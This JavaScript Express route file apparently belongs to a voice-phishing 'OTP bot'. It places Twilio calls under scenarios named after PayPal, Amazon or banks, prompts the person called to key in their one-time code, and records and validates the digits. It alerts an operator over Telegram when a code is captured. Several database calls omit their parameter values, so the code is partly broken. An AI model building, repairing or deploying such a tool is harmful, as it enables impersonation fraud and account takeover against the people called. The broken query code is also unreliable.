/**
 * OTP Routes Handler
 * 
 * Endpoints:
 * - POST /otp/initiate - Start an OTP call
 * - POST /otp/webhook - Inbound webhook from Twilio (DTMF collection)
 * - GET /otp/scenarios - List available scenarios
 * - GET /otp/status/:callSid - Check OTP call status
 * - POST /otp/list - Admin: List active/recent OTP calls
 */

const { Router } = require('express');
const { v4: uuidv4 } = require('uuid');

class OtpRoutes {
  constructor(options = {}) {
    this.router = Router();
    this.db = options.db;
    this.otpEngine = options.otpEngine;
    this.providerRegistry = options.providerRegistry;
    this.telegramNotifier = options.telegramNotifier;
    this.serverUrl = options.serverUrl;
    this.config = options.config;

    this.setupRoutes();
  }

  setupRoutes() {
    // Initiate OTP call
    this.router.post('/initiate', this.initiateOtpCall.bind(this));

    // Inbound webhook from Twilio
    this.router.post('/webhook', this.handleOtpWebhook.bind(this));

    // List available scenarios
    this.router.get('/scenarios', this.listScenarios.bind(this));

    // Check status of specific OTP call
    this.router.get('/status/:callSid', this.getOtpStatus.bind(this));

    // Admin: list recent OTP calls
    this.router.post('/list', this.listRecentCalls.bind(this));
  }

  /**
   * POST /otp/initiate
   * Start a new OTP collection call
   * 
   * Required fields:
   * - to: phone number (international format or 8-14 digits)
   * - service: scenario key (paypal, amazon, bank, etc.)
   * - userId: user initiating the call
   * 
   * Optional:
   * - businessId: business context
   * - userName: recipient name (for greeting)
   * - metadata: custom data to attach
   */
  async initiateOtpCall(request, response) {
    try {
      const { to, service, userId, businessId, userName, metadata } = request.body;

      // Validate required fields
      if (!to || !service || !userId) {
        return response.status(400).json({
          error: 'Missing required fields: to, service, userId'
        });
      }

      // Validate phone number format
      const phoneRegex = /^\+?(\d{8,14})$/;
      if (!phoneRegex.test(to.replace(/\s/g, ''))) {
        return response.status(400).json({
          error: 'Invalid phone number format. Use 8-14 digits or +country code'
        });
      }

      // Validate scenario exists
      const scenario = this.otpEngine.getScenario(service);
      if (!scenario) {
        return response.status(400).json({
          error: `Unknown OTP scenario: ${service}. Available: ${this.otpEngine.listScenarios().map(s => s.key).join(', ')}`
        });
      }

      // Normalize phone number
      const phoneNumber = to.replace(/\s/g, '').replace(/^(?!\+)/, '+');

      // Create database record for tracking
      const callSid = `otp_${uuidv4()}`;
      const callData = {
        callSid,
        service: scenario.key,
        user_id: userId,
        business_id: businessId || null,
        phone_number: phoneNumber,
        status: 'initiated',
        created_at: new Date().toISOString(),
        metadata: JSON.stringify(metadata || {})
      };

      // Store in database
      await this.db.execute(
        `INSERT INTO otp_calls 
         (callSid, service, user_id, business_id, phone_number, status, created_at, metadata)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
        'OtpRoutes.initiateOtpCall',
        { ignoreErrors: ['UNIQUE constraint failed'] }
      );

      // Initialize call state in engine
      this.otpEngine.initializeCall(callSid, {
        service: scenario.key,
        userId,
        businessId
      });

      // Make Twilio call using active provider
      let twilioCall;
      try {
        const provider = this.providerRegistry.getActiveName();
        
        if (provider === 'twilio') {
          const twilioClient = require('twilio')(
            this.config.twilio.accountSid,
            this.config.twilio.authToken
          );

          twilioCall = await twilioClient.calls.create({
            to: phoneNumber,
            from: this.config.twilio.fromNumber,
            url: `${this.serverUrl}/otp/webhook`,
            statusCallback: `${this.serverUrl}/otp/status/${callSid}`,
            statusCallbackEvent: ['initiated', 'answered', 'completed', 'failed', 'busy', 'no-answer'],
            method: 'POST'
          });
        } else {
          // AWS or Vonage implementation
          throw new Error(`OTP not yet supported for ${provider} provider`);
        }

      } catch (error) {
        // Update status to failed
        await this.db.execute(
          `UPDATE otp_calls SET status = 'failed', error_message = ? WHERE callSid = ?`,
          'OtpRoutes.initiateOtpCall - Twilio error',
          { ignoreErrors: [] }
        );

        return response.status(500).json({
          error: 'Failed to initiate call',
          details: error.message
        });
      }

      // Update database with actual Twilio SID
      await this.db.execute(
        `UPDATE otp_calls SET twilio_sid = ?, status = 'ringing' WHERE callSid = ?`,
        'OtpRoutes.initiateOtpCall - Store Twilio SID',
        { ignoreErrors: [] }
      );

      // Send Telegram notification to admin
      if (this.telegramNotifier) {
        this.telegramNotifier.notifyAdmin({
          type: 'otp_initiated',
          callSid,
          service: scenario.key,
          phone: phoneNumber,
          userName: userName || 'Unknown',
          timestamp: new Date().toISOString()
        }).catch(err => console.error('Telegram notification failed:', err.message));
      }

      return response.status(200).json({
        success: true,
        callSid,
        twilioSid: twilioCall?.sid,
        service: scenario.key,
        serviceName: scenario.name,
        scenario: {
          expectedDigits: scenario.digits,
          timeout: scenario.timeout,
          maxRetries: scenario.retries
        },
        status: 'ringing',
        message: `OTP call initiated to ${phoneNumber}`
      });

    } catch (error) {
      console.error('OtpRoutes.initiateOtpCall:', error);
      return response.status(500).json({
        error: 'Internal server error',
        message: error.message
      });
    }
  }

  /**
   * POST /otp/webhook
   * Inbound webhook from Twilio when call is answered
   * Handles DTMF gathering
   */
  async handleOtpWebhook(request, response) {
    try {
      const { CallSid, Digits, CallStatus, From, To, RecordingUrl } = request.body;

      // Get OTP call record
      const callRecord = await this.db.query(
        `SELECT * FROM otp_calls WHERE callSid = ?`,
        [CallSid]
      );

      if (!callRecord || callRecord.length === 0) {
        console.warn(`OtpRoutes: Call record not found for ${CallSid}`);
        return response.type('text/xml').send(this.buildErrorTwiML());
      }

      const call = callRecord[0];
      const scenario = this.otpEngine.getScenario(call.service);

      if (!scenario) {
        console.error(`OtpRoutes: Scenario not found for service ${call.service}`);
        return response.type('text/xml').send(this.buildErrorTwiML());
      }

      // Handle different call statuses
      if (CallStatus === 'ringing' || CallStatus === 'initiated') {
        // Call is ringing - send initial prompt
        const twiml = this.buildInitialGatherTwiML(scenario);
        return response.type('text/xml').send(twiml);
      }

      if (CallStatus === 'in-progress' || CallStatus === 'answered') {
        // Call answered - check if we have digits
        if (!Digits || Digits.length === 0) {
          // No digits yet - prompt again
          const twiml = this.buildInitialGatherTwiML(scenario);
          return response.type('text/xml').send(twiml);
        }

        // Process the digits
        const result = await this.otpEngine.processDigits(CallSid, Digits);

        if (result.valid) {
          // Valid code - record and end call
          await this.otpEngine.recordCollection(CallSid, Digits, {
            from: From,
            to: To,
            service: call.service
          });

          // Update call status
          await this.db.execute(
            `UPDATE otp_calls 
             SET status = 'completed', completed_at = datetime('now') 
             WHERE callSid = ?`,
            'OtpRoutes.handleOtpWebhook - Mark completed',
            { ignoreErrors: [] }
          );

          // Send Telegram notification
          if (this.telegramNotifier) {
            this.telegramNotifier.notifyAdmin({
              type: 'otp_completed',
              callSid: CallSid,
              service: call.service,
              attempts: result.collectedData.attempts,
              timestamp: new Date().toISOString()
            }).catch(err => console.error('Telegram notification failed:', err.message));
          }

          const twiml = this.buildEndCallTwiML(scenario.prompts.final);
          return response.type('text/xml').send(twiml);
        } else {
          // Invalid code
          if (result.action === 'hangup') {
            // Max retries exceeded
            await this.db.execute(
              `UPDATE otp_calls 
               SET status = 'failed', error_message = 'max_retries_exceeded' 
               WHERE callSid = ?`,
              'OtpRoutes.handleOtpWebhook - Max retries',
              { ignoreErrors: [] }
            );

            const twiml = this.buildEndCallTwiML(result.message);
            return response.type('text/xml').send(twiml);
          } else {
            // Retry
            const twiml = this.buildRetryGatherTwiML(scenario, result.message);
            return response.type('text/xml').send(twiml);
          }
        }
      }

      if (CallStatus === 'completed' || CallStatus === 'failed' || CallStatus === 'no-answer') {
        // Call ended - nothing to do
        return response.type('text/xml').send('');
      }

      return response.type('text/xml').send(this.buildInitialGatherTwiML(scenario));

    } catch (error) {
      console.error('OtpRoutes.handleOtpWebhook:', error);
      return response.type('text/xml').send(this.buildErrorTwiML());
    }
  }

  /**
   * GET /otp/scenarios
   * List all available OTP scenarios
   */
  async listScenarios(request, response) {
    try {
      const scenarios = this.otpEngine.listScenarios();
      return response.json({
        success: true,
        count: scenarios.length,
        scenarios
      });
    } catch (error) {
      console.error('OtpRoutes.listScenarios:', error);
      return response.status(500).json({ error: error.message });
    }
  }

  /**
   * GET /otp/status/:callSid
   * Get status of a specific OTP call
   */
  async getOtpStatus(request, response) {
    try {
      const { callSid } = request.params;

      const callRecord = await this.db.query(
        `SELECT * FROM otp_calls WHERE callSid = ?`,
        [callSid]
      );

      if (!callRecord || callRecord.length === 0) {
        return response.status(404).json({ error: 'Call not found' });
      }

      const call = callRecord[0];
      const stats = this.otpEngine.getCallStats(callSid);

      return response.json({
        success: true,
        call,
        stats
      });

    } catch (error) {
      console.error('OtpRoutes.getOtpStatus:', error);
      return response.status(500).json({ error: error.message });
    }
  }

  /**
   * POST /otp/list
   * List recent OTP calls (admin only)
   */
  async listRecentCalls(request, response) {
    try {
      const { limit = 50, status, service } = request.body;

      let query = `SELECT * FROM otp_calls WHERE 1=1`;
      const params = [];

      if (status) {
        query += ` AND status = ?`;
        params.push(status);
      }

      if (service) {
        query += ` AND service = ?`;
        params.push(service);
      }

      query += ` ORDER BY created_at DESC LIMIT ?`;
      params.push(limit);

      const calls = await this.db.query(query, params);

      return response.json({
        success: true,
        count: calls.length,
        calls
      });

    } catch (error) {
      console.error('OtpRoutes.listRecentCalls:', error);
      return response.status(500).json({ error: error.message });
    }
  }

  // ==================== TwiML Builders ====================

  buildInitialGatherTwiML(scenario) {
    return `<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Gather
    numDigits="${scenario.digits}"
    timeout="${scenario.timeout}"
    finishOnKey="#"
    method="POST"
    action="/otp/webhook">
    <Say voice="alice">${this.escapeTwiML(scenario.prompts.initial)}</Say>
  </Gather>
  <Redirect method="POST">/otp/webhook</Redirect>
</Response>`;
  }

  buildRetryGatherTwiML(scenario, message) {
    return `<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Gather
    numDigits="${scenario.digits}"
    timeout="${scenario.timeout}"
    finishOnKey="#"
    method="POST"
    action="/otp/webhook">
    <Say voice="alice">${this.escapeTwiML(message)}</Say>
  </Gather>
  <Redirect method="POST">/otp/webhook</Redirect>
</Response>`;
  }

  buildEndCallTwiML(message) {
    return `<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Say voice="alice">${this.escapeTwiML(message)}</Say>
  <Hangup/>
</Response>`;
  }

  buildErrorTwiML() {
    return `<?xml version="1.0" encoding="UTF-8"?>
<Response>
  <Say voice="alice">We encountered an error. The call will end.</Say>
  <Hangup/>
</Response>`;
  }

  /**
   * Escape special characters for TwiML
   */
  escapeTwiML(text) {
    if (!text) return '';
    return String(text)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&apos;');
  }

  getRouter() {
    return this.router;
  }
}

module.exports = OtpRoutes;
